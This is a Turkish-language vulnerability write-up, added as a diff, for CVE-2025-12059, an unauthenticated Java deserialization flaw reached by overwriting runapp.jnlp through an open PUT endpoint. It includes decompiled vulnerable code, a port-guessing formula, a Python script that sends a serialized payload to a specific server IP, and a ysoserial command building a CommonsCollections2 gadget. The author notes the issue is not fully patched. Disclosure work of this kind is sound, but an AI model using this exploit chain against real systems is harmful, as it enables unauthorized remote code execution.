@@ -1,0 +1,105 @@
+---
+title: "CVE-2025-12059"
+description: "CWE-502"
+---
+
+Deserializasyon hataları Java ekosisteminde sık ve tehlikelidir, zayıf bir `readObject()` çağrısı, uygun gadget zincirleriyle çalıştırılabilecek kötü amaçlı kodu doğrudan tetikler. Eğer uygulama dışarıdan yazılabilen dosyaları deserialize ediyorsa veya web katmanı üzerinden bu içeriği içe alıyorsa, risk **uzaktan** ve **kimlik doğrulamasız** hale gelir.
+
+## Olay Akışı
+
+- Web uygulaması `xx.xxx.xx.xxx:8080/xxxx/smart/run` üzerinde çalışıyor ve `PUT` yöntemine açık.
+- `PUT /xxxx/smart/runapp.jnlp` gibi bir istekle `runapp.jnlp` içeriği değiştirebiliyorsun (auth gerekmiyor).
+- Sunucular daha sonra bu JNLP dosyasını veya içindeki referansları okuyup`ObjectInputStream` ile deserialize ediyor.
+
+## Teknik kanıt
+
+runapp.jnlp içeriğinden doğruca startup.jar dosyasına yönlendirme var, ilgili linke gidip jar dosyasını sistemimde decode edip analiz ettim.\
+\
+JAR içindeki `com.lbs.start.SocketToken` / `new ServerSocket(port)` + `ObjectInputStream.readObject()` çağrıları gelen socket üzerinde doğrudan `readObject()` çağırıyor.
+
+```java
+ try {
+  in = new ObjectInputStream(s.getInputStream());
+  message = (String)in.readObject();
+  System.out.println("server>" + message);
+  out.writeObject("LBS_Hello");
+  out.flush();
+  message = (String)in.readObject(); // doğrudan deserializasyon
+  if (message != null && message.equals("LBS_Hello"))
+  {
+System.out.println("PORT_TOKEN_CREATED");
+  return 0;
+ }
+```
+
+- Ayrıca `initListen(...)` içinde `ms_Instance.accept()` ile kabul edilen bağlantılarda yine `new ObjectInputStream(connection.getInputStream())` çağrısı ve `processor.processToken(message)` ile gelen nesnenin uygulama mantığına verildiği görülüyor.
+- Gelen veriye **hiçbir güvenlik filtresi uygulanmadan** `readObject()` çağrısı yapılmakta.
+
+Sunucu portunu bulma işide zor değil, aynı yapıda nasıl bulunabileceği gösteriliyor.
+
+```java
+/*     */   public static int createPortNumber(int userId, int firmNr) {
+/*  52 */     int port = 50000 + firmNr * 100;
+/*  53 */     port += userId;
+/*  54 */     return port;
+/*     */   }
+```
+
+Ne demiştik, sunucu 8080 portu üzerinden yabancı kabul ediyor, ben şunu buldum, xxxxxxxx:50011\
+gibi portları deneyince öyle bir port var ama dışarıya erişimi kapalıydı.
+
+Herşey okey, kodlarda  biz zafiyet var, .ser dosyamı hazırladım ama karşı sunucular lokalde çalışıyor, dışarıya erişimi kapalı. Hemen planlamaya geçtim, 8080 portu eğer lokal sunuculara aracı olabilmemi sağlarsa bunu RCE olarak geçirebilirdim, hemen denedim.\
+\
+[exploit.py](http://exploit.py) 
+
+```python
+import requests
+
+url = "http://85.153.151.52:8080/logo/smart/runapp?mem=2048&lang=TRTR&access_token=test123&tenantId=1&firmNr=001"
+payload_file = "payload.ser" ## bizim dosya
+
+with open(payload_file, "rb") as f:
+    payload = f.read()
+
+response = requests.head(url, data=payload)
+
+print(f"[+] Response: {response.status_code}")
+print(response.headers)
+
+if response.status_code == 200:
+    print("[+] HEAD request successfully sent.")
+else:
+    print(f"[!] Error: {response.status_code}")
+```
+
+Öyle çetrefilli bir olayı yok, tek olayımız şu, runapp.jnlp'e dosyamızı atmak ve deserilize ediyormu onu ölçmek.
+
+<img
+  src="/images/Ekrangörüntüsü2025-11-01031514.png"
+  alt="Ekrangörüntüsü2025 11 01031514 Pn"
+  title="Ekrangörüntüsü2025 11 01031514 Pn"
+  style={{ width:"75%" }}
+/>
+
+```bash
+java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
+     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+     --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+     --add-opens java.base/java.util=ALL-UNNAMED \
+     -jar ysoserial-all.jar CommonsCollections2 "touch /tmp/pwned" > payload.ser
+```
+
+Görselde ki gibi, gerçektende runapp.jnlp'e dosya göndermeyi başardım ve 8080 portu üzerinde dosyamı görebiliyordum. aynı şekilde jnlp dosyası içerisinde de gözüküyordu. Son kod bloğu ise payload.ser'in içeriğiydi ve gerçektende sistemde gadget çalıştırıp tmp/pwned klasörünü oluşturmuştum. 
+
+Şu anda ilgili firma zafiyeti tamamen gidermediği için, güvenlik riski devam ettiği sürece ayrıntılı poc veya exploit kodu yayımlamıyorum.
+
+## Impact
+
+\
+Unauthenticated RCE yetki gerektirmiyor, uzaktan erişilebilir port/endpoint var.
+
+Potansiyel etkiler: data exfiltration, lateral movement, sistem tam kontrolü.
+
+ **CVSS v3.1 = 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)**
+
+gerekçe: uzaktan, düşük karmaşıklık, hiç yetki gerektirmiyor, kullanıcı etkileşimi yok, tüm gizlilik/ bütünlük/erişilebilirlik kritik düzeyde etkileniyor.
